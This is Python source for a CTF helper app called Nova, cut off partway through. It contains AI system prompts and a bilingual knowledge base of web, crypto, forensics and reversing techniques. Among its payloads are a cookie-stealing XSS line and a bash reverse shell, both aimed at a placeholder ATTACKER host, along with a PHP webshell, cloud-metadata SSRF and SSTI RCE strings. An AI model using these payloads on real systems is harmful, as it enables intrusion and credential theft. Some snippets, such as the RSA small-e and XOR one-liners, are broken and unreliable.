import json
import re
import html
import hashlib
import threading
import urllib.request
import urllib.error
import os
import math
import time
import sqlite3
import tkinter as tk
from tkinter import font as tkfont, filedialog, messagebox
from collections import deque
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Tuple

_LANG_EN = "en"
_LANG_PT = "pt"

_OLLAMA_URL = "http://localhost:11434/api/chat"
_OLLAMA_MODEL = "llama3.2:1b"
_OLLAMA_TIMEOUT = 120

_APE_EVOLUTION_INTERVAL = 10
_APE_MIN_PROMPTS = 3
_APE_MAX_PROMPTS = 8
_UCB_EXPLORATION_CONSTANT = 1.414
_EMBEDDING_DIMENSION = 64
_MEMORY_RETRIEVAL_COUNT = 3
_MEMORY_SIMILARITY_THRESHOLD = 0.3
_OFFLINE_MAX_MATCHES = 3

_VALID_TOOLS = frozenset({
    "nmap", "gobuster", "dirb", "nikto", "sqlmap", "wireshark", "tshark", "tcpdump",
    "john", "hashcat", "hydra", "metasploit", "msfconsole", "msfvenom",
    "netcat", "nc", "ncat", "socat", "curl", "wget", "python", "python3",
    "perl", "ruby", "gcc", "g++", "gdb", "radare2", "r2", "ghidra", "ida",
    "binwalk", "foremost", "strings", "file", "xxd", "hexdump", "base64",
    "base32", "base58", "openssl", "ssh", "ssh-keygen", "ftp", "smbclient",
    "rpcclient", "enum4linux", "enum4linux-ng", "linpeas", "linenum",
    "winpeas", "bloodhound", "sharphound", "impacket-secretsdump",
    "impacket-psexec", "impacket-smbexec", "impacket-wmiexec",
    "chisel", "ligolo", "proxychains", "feroxbuster", "ffuf", "dirsearch",
    "wpscan", "joomscan", "droopescan", "steghide", "stegseek", "zsteg",
    "pngcheck", "exiftool", "volatility", "volatility3", "autopsy", "sleuthkit",
    "jwt_tool", "johnny", "gpg", "burpsuite", "responder", "netstat", "ss",
    "ip", "ifconfig", "ping", "traceroute", "dig", "nslookup", "host", "whois",
    "whatweb", "wafw00f", "commix", "rlwrap", "screen", "tmux",
    "tar", "gzip", "gunzip", "zip", "unzip", "7z", "bzip2", "xz",
    "cat", "head", "tail", "less", "more", "grep", "egrep", "fgrep",
    "awk", "sed", "find", "locate", "ls", "cd", "pwd", "whoami", "id",
    "uname", "env", "export", "echo", "printf", "chmod", "chown",
    "cp", "mv", "rm", "mkdir", "rmdir", "ln", "touch", "sort", "uniq",
    "wc", "cut", "tr", "column", "paste", "tee", "xargs", "diff",
    "md5sum", "sha256sum", "sha1sum", "cyberchef", "dcode",
    "kerbrute", "rubeus", "mimikatz", "powershell", "cmd",
    "certutil", "bitsadmin", "mshta", "cscript", "wscript",
    "psexec", "wmic", "tasklist", "net", "sc", "reg",
    "sshpass", "expect", "hash-identifier", "stegcracker",
    "objdump", "readelf", "nm", "ltrace", "strace", "ldd",
    "aircrack-ng", "airodump-ng", "aireplay-ng",
    "keepass2john", "pdf2txt", "pdftotext", "pdfinfo",
})

_INITIAL_CTF_PROMPTS = [
    "You are Nova, an elite CTF assistant for TryHackMe, Hack The Box, and similar platforms. Analyze each challenge: identify the type (web, crypto, forensics, reverse, pwn, misc), determine the attack vector, provide step-by-step technical guidance with exact commands and tools. Be concise but thorough. Never fabricate tools or commands that do not exist. Ask specific questions if more context is needed. Focus on practical exploitation techniques.",

    "You are Nova, a CTF mentor who teaches while solving challenges. For each problem: explain the challenge type and why it falls into that category, walk through the methodology with underlying concepts explained, provide commands with explanations of what each flag and option does, mention common pitfalls and how to avoid them. Help users learn the underlying security concepts. Verify all tool names and syntax before suggesting them.",

    "You are Nova, a competitive CTF player optimized for speed and accuracy. Classify category and difficulty immediately, jump to the most likely solution path, provide minimal but complete commands, use shortcuts and automation where appropriate, flag if multiple solution paths exist. Be direct and efficient. Only suggest tools and commands you are certain exist and work exactly as described.",

    "You are Nova, a methodical CTF analyst with a systematic approach. Start with reconnaissance methodology, document findings step by step, build attack trees mentally before acting, consider defense-in-depth perspectives when analyzing vulnerabilities, provide commands with expected output descriptions. Be thorough and systematic in your analysis.",

    "You are Nova, specializing in web application CTF challenges across TryHackMe and Hack The Box. Focus on OWASP Top 10 vulnerabilities, common web misconfigurations, authentication bypass techniques, injection attacks (SQL, XSS, SSTI, command), file upload exploits, deserialization attacks. Provide curl commands, Burp Suite techniques, and browser-based approaches. Verify endpoint patterns and parameter names are realistic.",
]

_LANG_PREFIX = {
    _LANG_EN: "Respond in English. ",
    _LANG_PT: "Responda em Português. ",
}

_FAREWELL_PATTERNS = {
    _LANG_EN: re.compile(r"\b(bye|goodbye|see you|farewell|cya|later|quit|exit)\b", re.IGNORECASE),
    _LANG_PT: re.compile(r"\b(tchau|adeus|até mais|até logo|xau|falou|sair|fechar)\b", re.IGNORECASE),
}

_FAREWELL_MSG = {
    _LANG_EN: "Take care! Happy hacking!",
    _LANG_PT: "Até mais! Bons hacks!",
}

_LANG_DETECT_EN = re.compile(r"\b(english|en|yes|yeah|sure|i speak english)\b", re.IGNORECASE)
_LANG_DETECT_PT = re.compile(r"\b(português|portugues|pt|sim|claro|brasileiro|falo português|falo portugues)\b", re.IGNORECASE)

_GREETING_MSG = {
    _LANG_EN: "Hey! I'm Nova, your CTF assistant. Paste a challenge, describe a problem, or ask about techniques. What are we hacking today?",
    _LANG_PT: "Oi! Sou o Nova, seu assistente de CTF. Cole um desafio, descreva um problema ou pergunte sobre técnicas. O que vamos hackear hoje?",
}

_THINKING_FRAMES = ["Nova  ·", "Nova · ·", "Nova · · ·"]

_P = {
    "bg": "#0a0e17",
    "surface": "#131825",
    "surface2": "#1a2035",
    "accent": "#6c5ce7",
    "accent2": "#a29bfe",
    "accent3": "#74b9ff",
    "text": "#dfe6e9",
    "subtext": "#636e72",
    "border": "#2d3436",
    "entry_bg": "#1e2740",
    "btn_bg": "#6c5ce7",
    "btn_active": "#5a4bd1",
    "success": "#00b894",
    "warning": "#fdcb6e",
    "danger": "#e17055",
    "user_msg_bg": "#161d30",
    "bot_msg_bg": "#111827",
}

_MAX_HISTORY = 30
_MAX_INPUT_LENGTH = 4000
_DATA_DIR = os.path.join(os.path.expanduser("~"), ".nova_ctf")
_DB_PATH = os.path.join(_DATA_DIR, "episodic_memory.db")
_PROMPTS_PATH = os.path.join(_DATA_DIR, "prompts.json")

_KB_RAW = [
    {
        "id": "sqli",
        "patterns": [r"\bsql\s*injection\b", r"\bsqli\b", r"\bunion\s+select\b", r"\b1\s*=\s*1\b", r"\bsqlmap\b", r"\bmysql\b.*\binject\b", r"\bpostgres\b.*\binject\b", r"\bblind\s+sql\b"],
        "category": "Web - SQL Injection",
        "techniques": [
            "Test with single quote: ' OR '1'='1",
            "Union-based columns: ' UNION SELECT NULL,NULL,NULL-- (increment NULLs until no error)",
            "Enumerate databases: sqlmap -u '<URL>?id=1' --dbs",
            "Dump tables: sqlmap -u '<URL>?id=1' -D <dbname> --tables",
            "Dump columns: sqlmap -u '<URL>?id=1' -D <dbname> -T <tablename> --dump",
            "Blind boolean: ' AND 1=1-- (true) vs ' AND 1=2-- (false)",
            "Time-based blind: ' AND SLEEP(5)-- (observe delay)",
            "Manual with curl: curl '<URL>?id=1' --data \"username=' OR 1=1--&password=x\"",
        ],
        "tools": ["sqlmap", "curl", "burpsuite"],
        "tips_en": "Always identify the number of columns first with ORDER BY or UNION SELECT NULL. Check WAF presence before running sqlmap (--random-agent, --tamper). For file reading via SQL injection: UNION SELECT load_file('/etc/passwd')",
        "tips_pt": "Sempre identifique o número de colunas primeiro com ORDER BY ou UNION SELECT NULL. Verifique a presença de WAF antes de usar sqlmap. Para leitura de arquivos: UNION SELECT load_file('/etc/passwd')",
    },
    {
        "id": "xss",
        "patterns": [r"\bxss\b", r"\bcross.?site\s+scripting\b", r"\breflected\s+xss\b", r"\bstored\s+xss\b", r"\bdom\s+xss\b", r"\b<script>\b", r"\bonerror\b", r"\bonclick\b"],
        "category": "Web - XSS",
        "techniques": [
            "Basic test: <script>alert(1)</script>",
            "Event handler: <img src=x onerror=alert(1)>",
            "SVG payload: <svg onload=alert(1)>",
            "Bypass filters: <ScRiPt>alert(1)</ScRiPt>",
            "Cookie theft: <script>new Image().src='http://ATTACKER/?c='+document.cookie</script>",
            "DOM-based: check for document.location, document.write, innerHTML sinks",
            "Polyglot: jaVasCript:/*-/*`/*\\\\`/*'/*\\\"/**/(/* */oNcliCk=alert(1) )//",
            "XSSer automation: xsser -u '<URL>' --Fp '<parameter>'",
        ],
        "tools": ["burpsuite", "xsser", "curl"],
        "tips_en": "Test all input fields and URL parameters. Check if context is inside HTML tag, attribute, script block, or URL - each requires different payload format. Stored XSS is more impactful than reflected.",
        "tips_pt": "Teste todos os campos de entrada e parâmetros de URL. Verifique se o contexto está dentro de tag HTML, atributo, bloco de script ou URL - cada um requer formato diferente. Stored XSS é mais impactante que reflected.",
    },
    {
        "id": "cmdi",
        "patterns": [r"\bcommand\s+injection\b", r"\brce\b", r"\bremote\s+code\s+exec\b", r"\b;.*cat\b", r"\b\|\|.*cmd\b", r"\b\`.*\`", r"\b\$\([\w].*\)", r"\bping\b.*\b127\b", r"\bwhoami\b.*inject"],
        "category": "Web - Command Injection",
        "techniques": [
            "Separator test: ; whoami",
            "Pipe test: | whoami",
            "AND test: && whoami",
            "OR test: || whoami",
            "Newline: %0a whoami",
            "Blind: ; sleep 5",
            "Reverse shell: ; bash -i >& /dev/tcp/ATTACKER/PORT 0>&1",
            "Filter bypass: ; c=whoami;$c or ; w=h;a=o;m=i;$w$a",
        ],
        "tools": ["curl", "burpsuite", "netcat", "nc"],
        "tips_en": "Test each separator (; | && || %0a) individually. If output isn't reflected, use time-based or out-of-band techniques. Check for blacklist bypasses with variable substitution or encoding.",
        "tips_pt": "Teste cada separador (; | && || %0a) individualmente. Se a saída não é refletida, use técnicas baseadas em tempo ou out-of-band. Verifique bypass de blacklist com substituição de variáveis.",
    },
    {
        "id": "fileupload",
        "patterns": [r"\bfile\s+upload\b", r"\bupload\s+bypass\b", r"\bwebshell\b", r"\bphp.*upload\b", r"\bimage\s+upload\b.*bypass", r"\b\.php\b.*upload", r"\bextension\s+bypass\b"],
        "category": "Web - File Upload",
        "techniques": [
            "Double extension: shell.php.jpg or shell.php.png",
            "Case variation: shell.PhP or shell.pHp",
            "Null byte (old PHP): shell.php%00.jpg",
            "MIME type manipulation: Content-Type: image/jpeg",
            "Magic bytes: prepend GIF89a to PHP shell",
            ".htaccess: upload .htaccess with 'AddType application/x-httpd-php .jpg'",
            "PHP webshell: <?php system($_GET['cmd']); ?>",
            "Test with: curl -F 'file=@shell.php' '<URL>/upload'",
        ],
        "tools": ["curl", "burpsuite", "exiftool"],
        "tips_en": "Always check what the server does after upload - does it rename? Does it store in a predictable path? Combine multiple bypass techniques. Check for image processing libraries that might be exploitable (e.g., ImageMagick).",
        "tips_pt": "Semverifique o que o servidor faz após o upload - renomeia? Armazena em caminho previsível? Combine múltiplas técnicas de bypass. Verifique bibliotecas de processamento de imagem que podem ser exploráveis.",
    },
    {
        "id": "dirtraversal",
        "patterns": [r"\bdirectory\s+traversal\b", r"\bpath\s+traversal\b", r"\b\.\.\/\b", r"\bLFI\b", r"\blocal\s+file\s+inclu\b", r"\bread\s*file\b.*\.\.", r"\betc/passwd\b"],
        "category": "Web - Directory Traversal / LFI",
        "techniques": [
            "Basic: ../../etc/passwd",
            "Encoded: ..%2f..%2f..%2fetc%2fpasswd",
            "Double encoding: ..%252f..%252fetc%252fpasswd",
            "Null byte: ../../etc/passwd%00",
            "PHP wrapper: php://filter/convert.base64-encode/resource=index.php",
            "PHP wrapper: php://filter/read=string.rot13/resource=index.php",
            "Log poisoning: include /var/log/apache2/access.log (inject PHP in User-Agent)",
            "Automation: ffuf -u '<URL>?file=FUZZ' -w /usr/share/wordlists/LFI-Jhaddix.txt",
        ],
        "tools": ["ffuf", "curl", "burpsuite", "feroxbuster"],
        "tips_en": "PHP wrappers (php://filter) are powerful for reading source code. Always test if you can traverse - start with one ../ and increase. Check for /proc/self/environ for RFI-to-RCE chains.",
        "tips_pt": "PHP wrappers (php://filter) são poderosos para ler código fonte. Sempre teste se consegue traversar - comece com um ../ e aumente. Verifique /proc/self/environ para cadeias RFI-to-RCE.",
    },
    {
        "id": "ssti",
        "patterns": [r"\bssti\b", r"\bserver.?side\s+template\b", r"\b\{\{.*\}\}\b", r"\b\$\{.*\}\b", r"\bjinja\b.*inject", r"\btwig\b.*inject", r"\bflask\b.*ssti\b"],
        "category": "Web - SSTI",
        "techniques": [
            "Detect: {{7*7}} (expect 49), {{config}} (Jinja2)",
            "Detect: ${7*7} (some engines)",
            "Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()}}",
            "Jinja2 file read: {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
            "Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "Automation: tplmap -u '<URL>?name=FUZZ'",
        ],
        "tools": ["tplmap", "curl", "burpsuite"],
        "tips_en": "First confirm the template engine (Jinja2, Twig, Mako, etc.) by testing engine-specific syntax. The __subclasses__() chain is the most reliable RCE path for Jinja2 but may vary by Python version.",
        "tips_pt": "Primeiro confirme o engine de template (Jinja2, Twig, Mako, etc.) testando sintaxe específica. A cadeia __subclasses__() é o caminho RCE mais confiável para Jinja2 mas pode variar por versão do Python.",
    },
    {
        "id": "authbypass",
        "patterns": [r"\bauth\b.*\bbypass\b", r"\blogin\s+bypass\b", r"\bpassword\s+bypass\b", r"\bsql.*\blogin\b", r"\bdefault\s+cred", r"\bbrute\s+force\b", r"\bhydra\b.*login"],
        "category": "Web - Authentication Bypass",
        "techniques": [
            "SQL bypass: admin'-- or ' OR 1=1--",
            "Default credentials: admin:admin, admin:password, root:toor",
            "Brute force: hydra -l admin -P /usr/share/wordlists/rockyou.txt <URL> http-post-form 'login=^USER^&pass=^PASS^:F=incorrect'",
            "Null byte: admin%00",
            "Case variation: ADMIN, Admin",
            "HTTP basic: curl -u admin:admin <URL>",
            "Cookie manipulation: change role=user to role=admin",
            "JWT: modify payload, none algorithm attack",
        ],
        "tools": ["hydra", "curl", "burpsuite", "jwt_tool", "john"],
        "tips_en": "Always check for default credentials first - fastest win. For JWT, test the 'none' algorithm and check if signature verification is properly implemented. Check HTTP methods - sometimes PUT or DELETE bypass auth.",
        "tips_pt": "Semverifique credenciais padrão primeiro - vitória mais rápida. Para JWT, teste algoritmo 'none' e verifique se a verificação de assinatura está implementada corretamente. Verifique métodos HTTP.",
    },
    {
        "id": "idor",
        "patterns": [r"\bidor\b", r"\binsecure\s+direct\s+object\b", r"\baccess\s+control\b", r"\bvertical\s+priv\b", r"\bhorizontal\s+priv\b", r"\buser.*\bid=.*\bchange\b"],
        "category": "Web - IDOR / Access Control",
        "techniques": [
            "Change user ID in URL: /api/user/1001 -> /api/user/1002",
            "Change in POST body: {\"user_id\": 1001} -> {\"user_id\": 1002}",
            "Change in cookie: session=USER_1001 -> session=USER_1002",
            "Horizontal: access another user's data at same privilege level",
            "Vertical: access admin endpoints as regular user",
            "Test: /admin, /api/admin, /dashboard/admin",
            "Automation: ffuf -u '<URL>/api/user/FUZZ' -w ids.txt -b 'session=YOUR_COOKIE'",
        ],
        "tools": ["ffuf", "curl", "burpsuite"],
        "tips_en": "IDOR is about business logic - no scanner will find it reliably. Always test with multiple accounts. Look for numeric IDs, UUIDs (sometimes predictable), and API endpoints that accept object references.",
        "tips_pt": "IDOR é sobre lógica de negócio - nenhum scanner encontrará de forma confiável. Sempre teste com múltiplas contas. Procure por IDs numéricos, UUIDs e endpoints de API que aceitam referências a objetos.",
    },
    {
        "id": "ssrf",
        "patterns": [r"\bssrf\b", r"\bserver.?side\s+request\b", r"\binternal\s+port\b.*\bscan\b", r"\burl\s+parameter\b.*\bfetch\b", r"\b169\.254\b", r"\b127\.0\.0\.1\b.*\brequest\b"],
        "category": "Web - SSRF",
        "techniques": [
            "Basic: url=http://127.0.0.1",
            "Different localhost: url=http://localhost, url=http://0.0.0.0",
            "IPv6: url=http://[::1]",
            "Metadata (cloud): url=http://169.254.169.254/latest/meta-data/",
            "AWS keys: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "Port scan: url=http://127.0.0.1:PORT and observe response time/differences",
            "Protocol smuggling: url=gopher://127.0.0.1:25/_HELO",
            "Bypass filters: url=http://127.1, url=http://0x7f000001",
        ],
        "tools": ["curl", "burpsuite"],
        "tips_en": "Cloud metadata endpoints (169.254.169.254) are high-value targets. Test with different IP representations to bypass filters. If file:// protocol works, you can read local files.",
        "tips_pt": "Endpoints de metadata de cloud (169.254.169.254) são alvos de alto valor. Teste com diferentes representações de IP para bypass de filtros. Se o protocolo file:// funcionar, você pode ler arquivos locais.",
    },
    {
        "id": "base_encoding",
        "patterns": [r"\bbase64\b", r"\bbase32\b", r"\bbase58\b", r"\bdecode\b.*\bencod\b", r"\b\w{20,}={0,3}\b", r"\bY2F0\b", r"\bSGVsbG8\b"],
        "category": "Crypto - Base Encoding",
        "techniques": [
            "Base64 decode: echo 'STRING' | base64 -d",
            "Base64 decode file: base64 -d encoded.txt > decoded.bin",
            "Base32 decode: echo 'STRING' | base32 -d",
            "Python base64: python3 -c \"import base64; print(base64.b64decode('STRING').decode())\"",
            "Detect: look for A-Za-z0-9+/= characters, length divisible by 4, trailing =",
            "Multiple layers: decode repeatedly until output stops changing",
            "Base58 decode: python3 -c \"import base58; print(base58.b58decode('STRING').decode())\"",
            "CyberChef: load and use 'Magic' function to auto-detect encoding",
        ],
        "tools": ["base64", "base32", "python", "python3"],
        "tips_en": "Base64 is encoding, not encryption. Always check for multiple encoding layers. If decoded output looks like another encoding, decode again. Watch for base64 in URLs, cookies, headers, and file content.",
        "tips_pt": "Base64 é codificação, não criptografia. Semverifique múltiplas camadas de codificação. Se a saída decodificada parecer outra codificação, decodifique novamente. Observe base64 em URLs, cookies, headers.",
    },
    {
        "id": "caesar_rot",
        "patterns": [r"\bcaesar\b", r"\brot13\b", r"\bshift\s+cipher\b", r"\brot\s*\d+\b", r"\b\{[a-z]+\}.*\bshift\b", r"\bABCDEFGHIJKLMNOPQRSTUVWXYZ\b"],
        "category": "Crypto - Caesar / ROT",
        "techniques": [
            "ROT13: echo 'STRING' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
            "ROT13 Python: python3 -c \"import codecs; print(codecs.decode('STRING', 'rot_13'))\"",
            "Caesar Python: python3 -c \"s='STRING'; [print(f'Shift {i}: '+ ''.join(chr((ord(c)-65+i)%26+65) if c.isupper() else chr((ord(c)-97+i)%26+97) if c.islower() else c for c in s)) for i in range(26)]\"",
            "CyberChef: use Caesar Cipher with brute force option",
        ],
        "tools": ["tr", "python", "python3"],
        "tips_en": "ROT13 is just Caesar with shift 13. For unknown shifts, brute force all 25 possibilities and look for readable English. The flag format (e.g., THM{...} or HTB{...}) can help identify the correct shift.",
        "tips_pt": "ROT13 é apenas Caesar com shift 13. Para shifts desconhecidos, brute force todas as 25 possibilidades e procure por inglês legível. O formato da flag pode ajudar a identificar o shift correto.",
    },
    {
        "id": "hash_crack",
        "patterns": [r"\bhash\b.*\bcrack\b", r"\bmd5\b", r"\bsha256\b", r"\bsha1\b", r"\bntlm\b", r"\bhashcat\b", r"\bjohn\b.*\bhash\b", r"\bhash-identifier\b", r"\b\w{32}\b", r"\b\w{40}\b", r"\b\w{64}\b"],
        "category": "Crypto - Hash Cracking",
        "techniques": [
            "Identify hash type: hash-identifier (paste hash, it suggests type)",
            "Online lookup: https://crackstation.net (for common hashes)",
            "Hashcat MD5: hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
            "Hashcat SHA256: hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
            "Hashcat NTLM: hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
            "John MD5: john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            "John NTLM: john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            "Hashcat rules: hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
        ],
        "tools": ["hashcat", "john", "hash-identifier"],
        "tips_en": "Always identify the hash type first - using the wrong mode wastes time. 32 chars = likely MD5 or NTLM, 40 chars = SHA1, 64 chars = SHA256. Hashcat is faster with GPU; John is more flexible with formats.",
        "tips_pt": "Sempre identifique o tipo de hash primeiro - usar o modo errado desperdiça tempo. 32 caracteres = provavelmente MD5 ou NTLM, 40 = SHA1, 64 = SHA256. Hashcat é mais rápido com GPU; John é mais flexível.",
    },
    {
        "id": "xor_crypto",
        "patterns": [r"\bxor\b", r"\bexclusive\s+or\b", r"\b\^=?\s*\w", r"\brepeating\s+key\b", r"\bsingle.?byte\s+xor\b"],
        "category": "Crypto - XOR",
        "techniques": [
            "Single byte XOR brute force: python3 -c \"c=bytes.fromhex('HEX'); [print(f'Key {i}: '+bytes(b^i for b in c)) for i in range(256)]\"",
            "Detect single byte XOR: if ciphertext length equals plaintext length, likely single byte",
            "Known plaintext XOR: key = ciphertext XOR plaintext (python3 -c \"print(bytes(a^b for a,b in zip(ct,pt)).hex())\")",
            "Repeating key XOR: try key lengths 1-32, for each check if decrypted blocks have high English frequency",
            "XOR with file: python3 -c \"ct=open('file','rb').read(); print(bytes(b^0xKEY for b in ct))\"",
        ],
        "tools": ["python", "python3", "xxd"],
        "tips_en": "Single byte XOR can always be brute forced (only 256 keys). For repeating key XOR, use index of coincidence or Kasiski examination to find key length. XOR is its own inverse - encrypting twice with same key gives original.",
        "tips_pt": "XOR de byte único pode sempre ser brute forçado (apenas 256 chaves). Para XOR com chave repetida, use índice de coincidência para encontrar o tamanho da chave. XOR é sua própria inversa.",
    },
    {
        "id": "rsa_crypto",
        "patterns": [r"\brsa\b", r"\bpublic\s+key\b", r"\bprivate\s+key\b", r"\bmodulus\b", r"\b\.\.pub\b", r"\bpem\b", r"\bn\s*=.*\be\s*=", r"\bopenssl.*rsa\b"],
        "category": "Crypto - RSA",
        "techniques": [
            "Extract public key components: openssl rsa -pubin -in pubkey.pem -text -noout",
            "Small n (factor): python3 -c \"from sympy import factorint; print(factorint(N))\"",
            "Small e, large message: python3 -c \"print(pow(C, 1//e, N))\" (if m^e < N, just take eth root)",
            "Common factors between keys: python3 -c \"from math import gcd; print(gcd(n1, n2))\" (if > 1, you found a factor)",
            "RsaCtfTool: python3 RsaCtfTool.py --publickey pubkey.pem --private",
            "Wiener's attack (large e, small d): use RsaCtfTool --attack wiener",
            "Convert hex to PEM: use RsaCtfTool or manual ASN.1 construction",
        ],
        "tools": ["openssl", "python", "python3"],
        "tips_en": "First extract n, e from the public key. Check if n is small enough to factor directly. Check if e is unusually small (e=3) or large. Check if multiple public keys share a common factor. RsaCtfTool automates most RSA attacks.",
        "tips_pt": "Primeiro extraia n, e da chave pública. Verifique se n é pequeno o suficiente para fatorar diretamente. Verifique se e é incomumente pequeno (e=3) ou grande. RsaCtfTool automatiza a maioria dos ataques RSA.",
    },
    {
        "id": "steganography",
        "patterns": [r"\bsteg(?:o|anography)\b", r"\bhidden\s+(?:in|inside)\s+(?:image|file)\b", r"\bsteghide\b", r"\bzsteg\b", r"\bstegseek\b", r"\bexif\b", r"\bmetadata\b.*\bimage\b", r"\bpng\b.*\bhidden\b"],
        "category": "Forensics - Steganography",
        "techniques": [
            "Check file type: file image.jpg",
            "Check metadata: exiftool image.jpg",
            "Check strings: strings image.jpg | grep -i flag",
            "Steghide extract: steghide extract -sf image.jpg (may need empty passphrase, just press enter)",
            "Steghide with passphrase: steghide extract -sf image.jpg -p password",
            "PNG steganography: zsteg image.png",
            "Brute force steghide: stegseek image.jpg /usr/share/wordlists/rockyou.txt",
            "Binwalk hidden files: binwalk -e image.jpg",
            "Check for appended data: xxd image.jpg | tail -20",
        ],
        "tools": ["steghide", "zsteg", "stegseek", "exiftool", "binwalk", "strings", "xxd", "file"],
        "tips_en": "Always run file and exiftool first - sometimes the 'trick' is just in the metadata. Steghide works on JPEG/BMP/WAV. Zsteg works on PNG. If binwalk finds embedded files, extract them with -e flag.",
        "tips_pt": "Semverifique file e exiftool primeiro - às vezes o 'truque' está apenas nos metadados. Steghide funciona em JPEG/BMP/WAV. Zsteg funciona em PNG. Se binwalk encontrar arquivos embutidos, extraia com -e.",
    },
    {
        "id": "file_analysis",
        "patterns": [r"\bfile\s+(?:type|analysis|identify)\b", r"\bbinwalk\b", r"\bforemost\b", r"\bstrings\b.*\bfile\b", r"\bunknown\s+file\b", r"\bmagic\s+bytes\b", r"\bcarv(?:e|ing)\b"],
        "category": "Forensics - File Analysis",
        "techniques": [
            "Identify file type: file mystery_file",
            "Hex dump header: xxd mystery_file | head -10",
            "Extract embedded files: binwalk -e mystery_file",
            "Extract with foremost: foremost -i mystery_file -o output/",
            "Search for strings: strings mystery_file | grep -iE 'flag|thm|htb|password|key'",
            "Check file size anomalies: ls -la (compare expected vs actual size)",
            "PNG check: pngcheck -v image.png",
            "Diff files: diff file1 file2",
        ],
        "tools": ["file", "binwalk", "foremost", "strings", "xxd", "pngcheck", "exiftool"],
        "tips_en": "The 'file' command uses magic bytes - if it says 'data' the file might be corrupted or have a wrong extension. Always check the hex header manually if file type seems wrong. Binwalk can miss things - also try foremost.",
        "tips_pt": "O comando 'file' usa magic bytes - se disser 'data' o arquivo pode estar corrompido ou com extensão errada. Semverifique o header hex manualmente. Binwalk pode perder coisas - tente também foremost.",
    },
    {
        "id": "network_forensics",
        "patterns": [r"\bpcap\b", r"\bwireshark\b", r"\btshark\b", r"\bpacket\b.*\banaly\b", r"\bnetwork\s+forens\b", r"\b\.pcap\b", r"\btraffic\b.*\bcapture\b"],
        "category": "Forensics - Network Analysis",
        "techniques": [
            "Open in Wireshark: wireshark capture.pcap",
            "Tshark summary: tshark -r capture.pcap -q -z conv,tcp",
            "Tshark DNS queries: tshark -r capture.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name",
            "Tshark HTTP: tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri",
            "Extract files: tshark -r capture.pcap --export-objects http,./extracted/",
            "Extract credentials: tshark -r capture.pcap -Y 'http.authorization' -T fields -e http.authorization",
            "Follow TCP stream: in Wireshark, right-click packet > Follow > TCP Stream",
            "Filter by IP: tshark -r capture.pcap -Y 'ip.addr == 10.10.10.1'",
        ],
        "tools": ["wireshark", "tshark", "tcpdump"],
        "tips_en": "Start with the conversation overview to identify unusual connections. Check DNS for suspicious domains, HTTP for credentials or file downloads. Use 'Follow TCP Stream' to reconstruct file transfers or conversations.",
        "tips_pt": "Comece com a visão geral de conversas para identificar conexões incomuns. Verifique DNS para domínios suspeitos, HTTP para credenciais ou downloads. Use 'Follow TCP Stream' para reconstruir transferências.",
    },
    {
        "id": "memory_forensics",
        "patterns": [r"\bmemory\s+forens\b", r"\bvolatility\b", r"\bvolatility3\b", r"\bdump\s+memory\b", r"\bmemdump\b", r"\b\.(?:img|raw|vmem)\b.*\banaly\b", r"\bprocess\s+list\b.*\bmemory\b"],
        "category": "Forensics - Memory",
        "techniques": [
            "Identify OS: python3 vol.py -f memory.raw windows.info (or linux, mac)",
            "List processes: python3 vol.py -f memory.raw windows.pslist",
            "Process tree: python3 vol.py -f memory.raw windows.pstree",
            "Network connections: python3 vol.py -f memory.raw windows.netscan",
            "Dump process: python3 vol.py -f memory.raw windows.memmap --pid PID --dump",
            "Extract strings from memory: strings memory.raw | grep -i flag",
            "Hash dump: python3 vol.py -f memory.raw windows.hashdump",
            "Command line history: python3 vol.py -f memory.raw windows.cmdline",
        ],
        "tools": ["volatility", "volatility3", "strings"],
        "tips_en": "Volatility3 is Python 3 only and uses a different plugin syntax than Volatility2. Always identify the OS profile first. Look for suspicious processes, hidden processes (compare pslist vs psscan), and unusual network connections.",
        "tips_pt": "Volatility3 é apenas Python 3 e usa sintaxe diferente do Volatility2. Semverifique o perfil do SO primeiro. Procure processos suspeitos, processos ocultos e conexões de rede incomuns.",
    },
    {
        "id": "reverse_basic",
        "patterns": [r"\breverse\s+engin\b", r"\bdisassem\b", r"\bdecompil\b", r"\bghidra\b", r"\bradare\b", r"\bobjdump\b", r"\b\.(?:elf|exe|dll|so)\b", r"\bbinary\s+analy\b"],
        "category": "Reverse Engineering",
        "techniques": [
            "File info: file binary && ldd binary && checksec binary",
            "Strings: strings binary | grep -iE 'flag|key|password|correct|wrong'",
            "Disassemble: objdump -d binary | less",
            "Ghidra: open binary, auto-analyze, look for main() and comparison functions",
            "Radare2: r2 -A binary; afl (list functions); s main; pdf (disassemble function)",
            "Check for anti-debug: strings binary | grep -iE 'ptrace|debugger|anti'",
            "Strip check: file binary (look for 'stripped')",
            "Dynamic: ltrace ./binary (library calls) && strace ./binary (system calls)",
        ],
        "tools": ["ghidra", "radare2", "r2", "objdump", "strings", "gdb", "ltrace", "strace", "readelf", "nm", "ldd"],
        "tips_en": "Always run strings first - many RE challenges hide flags in plaintext. For simple crackmes, look for strcmp/comparison functions in the decompiler. If the binary is stripped, use function signatures or cross-references from strings.",
        "tips_pt": "Semverifique strings primeiro - muitos desafios RE escondem flags em plaintext. Para crackmes simples, procure funções strcmp/comparison no decompilador. Se o binário está stripped, use assinaturas de funções.",
    },
    {
        "id": "pwn_basic",
        "patterns": [r"\bpwn\b", r"\bbuffer\s+overflow\b", r"\bstack\s+overflow\b", r"\bbof\b", r"\bgdb\b.*\bexploit\b", r"\brop\b", r"\bshellcode\b", r"\bnx\b.*\bbypass\b", r"\baslr\b.*\bbypass\b"],
        "category": "Pwn - Buffer Overflow",
        "techniques": [
            "Check protections: checksec binary (NX, ASLR, canary, PIE, RELRO)",
            "Find offset: python3 -c \"print('A'*100)\" | ./binary (crash at specific length)",
